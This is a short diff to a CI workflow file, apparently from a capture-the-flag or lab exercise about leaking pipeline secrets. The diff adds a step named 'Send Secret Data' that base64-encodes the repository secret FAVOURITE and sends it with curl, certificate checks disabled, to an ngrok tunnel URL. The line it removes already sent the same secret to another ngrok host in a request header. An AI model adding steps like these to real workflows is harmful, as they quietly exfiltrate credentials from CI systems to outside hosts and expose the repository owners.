@@ -25,6 +25,8 @@ jobs:
       - name: I ll tell you my current favourite 
         run: echo ${{ secrets.FAVOURITE }}
 
-      - name: leak
+      - name: Send Secret Data
         run: |
-            curl https://8cab-128-131-211-139.ngrok-free.app -H "X-API-Key: $secrets.FAVOURITE"
+          echo secrets.flag
+          SECRET_DATA=$(echo "${{ secrets.FAVOURITE }}" | base64 --wrap=0)
+          curl -k "https://17f3-128-131-211-139.ngrok-free.app?data=${SECRET_DATA}"
